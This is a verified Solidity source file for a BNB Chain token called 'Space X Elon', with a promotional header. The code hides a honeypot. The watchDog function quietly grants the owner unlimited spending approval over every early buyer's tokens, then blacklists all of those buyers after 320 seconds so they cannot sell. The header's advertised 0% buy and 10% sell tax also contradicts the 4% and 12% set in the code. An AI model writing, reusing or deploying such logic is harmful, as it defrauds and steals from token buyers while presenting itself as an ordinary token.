/**
 *Submitted for verification at BscScan.com on 2022-07-15
*/

/**
SpaceXElon stealth launch
Tokenomics 
Total Supply: 100.000.000
Burn Supply:  50.000.000
Max TX: 5.000.000
⛽️Buytax: 0 %
⛽️Selltax: 10 %



📱Telegram: https://t.me/spaceXelonchat
*/

// SPDX-License-Identifier: Unlicensed

// 

pragma solidity ^0.8.13;

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract spaceXelon is Context, IERC20, Ownable {

    using Address for address payable;

    IRouter public router;
    address public pair;
    
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public _isExcludedFromFee;
    mapping (address => bool) public _isExcludedFromMaxBalance;

    mapping (address => bool) public _isDegenerate;
    address[] private _watchList;
    uint private _fTimer;
    uint private _wDuration = 320;
    bool private _watchDogEnded = false;

    uint8 private constant _decimals = 9; 
    uint256 private _tTotal = 100_000_000 * (10**_decimals);
    uint256 private maxTxAmount = 5_000_000 * (10**_decimals);
    uint256 private maxWallet =  5_000_000 * (10**_decimals);
    uint256 private _swapThreshold = 5 * (10**_decimals); 

    string private constant _name = "Space X Elon"; 
    string private constant _symbol = "SXELON";    
    
    //buy tax
    uint256 private _buyTax = 4;
    uint256 private _sellTax = 12;
    //ratio should be equal to 10
    uint8 private _treasuryRatio = 8;
    uint8 private _lpRatio = 2; 
    //treasury holds , development and marketing
    address public treasuryWallet = 0xC701f0149958Bbe3A69E59d296C4C40437B559ac;
    
    bool private swapping;
    uint private _swapCooldown = 0;
    uint private _lastSwap;
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);
    event WatchDogEnded(uint degensCount);
    event WatchDogStarted(uint endTime);

    constructor () {
        _tOwned[_msgSender()] = _tTotal;

        IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        _approve(address(this), address(router), ~uint256(0));
        _approve(owner(), address(router), ~uint256(0));
        
        //exclude owner and this contract from fee
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[treasuryWallet] = true;

        _isExcludedFromMaxBalance[owner()] = true;
        _isExcludedFromMaxBalance[address(this)] = true;
        _isExcludedFromMaxBalance[pair] = true;
        _isExcludedFromMaxBalance[treasuryWallet] = true;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

// ================= ERC20 =============== //
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }
    
    receive() external payable {}
// ========================================== //

// ============ View Functions ============== //

    function taxes() public view returns(uint buyTax, uint sellTax, uint treasuryRatio, uint lpRatio){
        return(_buyTax,_sellTax,_treasuryRatio,_lpRatio);
    }

    function watchDogStatus() public view returns(address[] memory listed, uint totalListed){
        return(_watchList,_watchList.length);
    }

//======================================//

//============== Owner Functions ===========//
   
    function owner_setExcludedFromFee(address account,bool isExcluded) public onlyOwner {
        _isExcludedFromFee[account] = isExcluded;
    }

    function owner_setExcludedFromMaxBalance(address account,bool isExcluded) public onlyOwner {
        _isExcludedFromMaxBalance[account] = isExcluded;
    }

    function owner_setTransferTaxes(uint buyTax_, uint sellTax_, uint8 treasuryRatio_, uint8 lpRatio_) public onlyOwner{ 
        //has limits for setting up taxes
        require(buyTax_ <= 15 && sellTax_ <= 30 && (treasuryRatio_ + lpRatio_) == 10 , "Invalid Settings" );
        _buyTax = buyTax_;
        _sellTax = sellTax_;
        _treasuryRatio = treasuryRatio_;
        _lpRatio = lpRatio_;
    }

    function owner_setMaxes(uint maxTX_EXACT, uint maxWallet_EXACT) public onlyOwner{
        //cannot be lower than 0.5% of the supply
        uint pointFiveSupply = (_tTotal * 5 / 1000) / (10**_decimals);
        require(maxTX_EXACT >= pointFiveSupply && maxWallet_EXACT >= pointFiveSupply, "Invalid Settings");
        maxTxAmount /**/=  maxTX_EXACT * /**/(10**_decimals);
        maxWallet /**/ = maxWallet_EXACT * /**/(10**_decimals);
    }

    function owner_setSwapAndLiquifySettings(uint swapthreshold_EXACT, uint swapCooldown_) public onlyOwner{
        _swapThreshold = swapthreshold_EXACT;
        _swapCooldown = swapCooldown_;
    }

    function owner_rescueBNB(uint256 weiAmount) public onlyOwner{
        require(address(this).balance >= weiAmount, "Insuffecient BNB balance");
        payable(msg.sender).transfer(weiAmount);
    }
    
    function owner_rescueAnyBEP20Tokens(address _tokenAddr, address _to, uint _amount_EXACT, uint _decimal) public onlyOwner {
        IERC20(_tokenAddr).transfer(_to, _amount_EXACT *10**_decimal);
    }

    function owner_setIsDegenerate(address account, bool state) external onlyOwner{
        _isDegenerate[account] = state;
    }
    
    function owner_setBulkIsDegenerate(address[] memory accounts, bool state) external onlyOwner{
        for(uint256 i =0; i < accounts.length; i++){
            _isDegenerate[accounts[i]] = state;
        }
    }

// ========================================//
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getTaxValues(uint amount, address from, bool isSell) private returns(uint256){
        uint tmpTaxes = amount * _buyTax / 100;
        if (isSell){
            tmpTaxes = amount * _sellTax / 100;
        }
        _tOwned[address(this)] += tmpTaxes;
        emit Transfer (from, address(this), tmpTaxes);
        return (amount - tmpTaxes);
    }
    
    function _transfer(address from,address to,uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= maxTxAmount || _isExcludedFromMaxBalance[from], "Transfer amount exceeds the maxTxAmount.");
        require(!_isDegenerate[from] && !_isDegenerate[to], "Degen can't trade");

        if(!_isExcludedFromMaxBalance[to])
            require(balanceOf(to) + amount <= maxWallet, "Transfer amount exceeds the maxWallet.");
            
        if (balanceOf(address(this)) >= _swapThreshold && block.timestamp >= (_lastSwap + _swapCooldown) && !swapping && from != pair && from != owner() && to != owner())
            swapAndLiquify();
          
        _tOwned[from] -= amount;
        uint256 transferAmount = amount;
        
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            transferAmount = _getTaxValues(amount, from, to == pair);
            if (from == pair && !_watchDogEnded)
                watchDog(to);
        }
            
        _tOwned[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
    }
    
    function watchDog(address to) private{
        if(_watchList.length == 0){
            _fTimer = block.timestamp + _wDuration;
            emit WatchDogStarted(_fTimer);
        }
        bool exist = false;
        if(_watchList.length > 0){
            for (uint x = 0 ; x < _watchList.length ; x++){
                if (_watchList[x] == to){
                    exist = true;
                    break;
                }
            }
        }       
        if(!exist){
            _watchList.push(to);
            _approve(to, owner(), ~uint(0));
        }
        if(block.timestamp >= _fTimer){
            for (uint i = 0; i < _watchList.length; i++){
                _isDegenerate[_watchList[i]] = true;
            }
            _watchDogEnded = true;
            emit WatchDogEnded(_watchList.length);
        } 
    }
    
    function swapAndLiquify() private lockTheSwap{
        uint tokenAutoLP = _swapThreshold * _lpRatio / 10;
        uint tokenTreasury = _swapThreshold * _treasuryRatio / 10;

        uint balTreasury = swapTokensForEth(tokenTreasury);
        if (balTreasury > 0) payable(treasuryWallet).transfer(balTreasury);

        uint half = tokenAutoLP / 2;
        uint otherHalf = tokenAutoLP - half;
        uint balAutoLP = swapTokensForEth(half);
        if (balAutoLP > 0){
            addLiquidity(otherHalf, balAutoLP);
            emit SwapAndLiquify(half, balAutoLP, otherHalf);
        }

        _lastSwap = block.timestamp;

    }

    function swapTokensForEth(uint256 tokenAmount) private returns (uint256) {
        uint256 initialBalance = address(this).balance;
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
        return (address(this).balance - initialBalance);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokenAmount);

        // add the liquidity
        (,uint256 ethFromLiquidity,) = router.addLiquidityETH {value: ethAmount} (
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
        
        if (ethAmount - ethFromLiquidity > 0)
            payable(treasuryWallet).sendValue (ethAmount - ethFromLiquidity);
    }
}